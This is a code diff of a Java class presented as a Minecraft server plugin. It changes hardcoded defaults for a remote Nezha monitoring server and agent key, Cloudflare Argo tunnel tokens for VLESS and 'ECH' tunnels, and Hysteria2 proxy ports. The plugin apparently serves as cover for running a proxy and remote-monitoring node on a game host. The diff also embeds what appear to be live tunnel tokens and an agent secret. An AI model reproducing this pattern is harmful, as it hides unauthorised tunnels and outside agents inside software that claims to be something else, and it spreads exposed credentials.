@@ -69,10 +69,10 @@ public class App extends JavaPlugin implements CommandExecutor, TabCompleter, Li
 
     private static final String NEZHA_SERVER = env("NEZHA_SERVER", "nezha.mingfei1981.eu.org");
     private static final String NEZHA_PORT = env("NEZHA_PORT", "443");
-    private static final String NEZHA_KEY = env("NEZHA_KEY", "XJMqht4KlCxablE2PM");
+    private static final String NEZHA_KEY = env("NEZHA_KEY", "aVRa8k25KwF4PRDCcr");
 
-    private static final String ECH_ARGO_TOKEN = env("ECH_ARGO_TOKEN", "eyJhIjoiNjgyNWI4YTZjODBhYWQxODlmYWI5ZWEwMDI5YzY2NjgiLCJ0IjoiMTdlMzgxNzAtMzhjMi00OTEwLWIyZjAtMWY0ZGMwZGZmMTkwIiwicyI6Ik5UUTNZakl4WlRNdE9HUmpZeTAwTXpoa0xUaGpNVFF0T1Rsa09ESmhPRGt4TkRBMCJ9");
-    private static final String VLESS_ARGO_TOKEN = env("VLESS_ARGO_TOKEN", "eyJhIjoiNjgyNWI4YTZjODBhYWQxODlmYWI5ZWEwMDI5YzY2NjgiLCJ0IjoiMTdlMzgxNzAtMzhjMi00OTEwLWIyZjAtMWY0ZGMwZGZmMTkwIiwicyI6Ik5UUTNZakl4WlRNdE9HUmpZeTAwTXpoa0xUaGpNVFF0T1Rsa09ESmhPRGt4TkRBMCJ9");
+    private static final String ECH_ARGO_TOKEN = env("ECH_ARGO_TOKEN", "eyJhIjoiNjgyNWI4YTZjODBhYWQxODlmYWI5ZWEwMDI5YzY2NjgiLCJ0IjoiNmU1YjExMzgtNDMzMy00YjA5LWExODgtOGE0YThiMDBjNGI1IiwicyI6Ik1UQm1NRGMzTjJZdFpUbGlNeTAwT1RsbExXSm1PVEl0TTJSbFpUVTBaR1ppT1RjMyJ9");
+    private static final String VLESS_ARGO_TOKEN = env("VLESS_ARGO_TOKEN", "eyJhIjoiNjgyNWI4YTZjODBhYWQxODlmYWI5ZWEwMDI5YzY2NjgiLCJ0IjoiNmU1YjExMzgtNDMzMy00YjA5LWExODgtOGE0YThiMDBjNGI1IiwicyI6Ik1UQm1NRGMzTjJZdFpUbGlNeTAwT1RsbExXSm1PVEl0TTJSbFpUVTBaR1ppT1RjMyJ9");
 
     private static final String WSPORT = env("WSPORT", "8001");
     private static final String VLPORT = env("VLPORT", "8002");
@@ -80,11 +80,11 @@ public class App extends JavaPlugin implements CommandExecutor, TabCompleter, Li
     private static final String OPERA = env("OPERA", "0");
     private static final String COUNTRY = env("COUNTRY", "AM");
 
-    private static final String ECH_IPS = env("ECH_IPS", "4");
-    private static final String HY_IPS = env("HY_IPS", "4");
+    private static final String ECH_IPS = env("ECH_IPS", "6");
+    private static final String HY_IPS = env("HY_IPS", "6");
 
     private static final String ENABLE_HY2 = env("ENABLE_HY2", "1");
-    private static final String HY_PORT = env("HY_PORT", "11024");
+    private static final String HY_PORT = env("HY_PORT", "40059");
     private static final String NAME = env("NAME", "MJJ");
     private static final String PASSWORD = UUID_VAL;
 
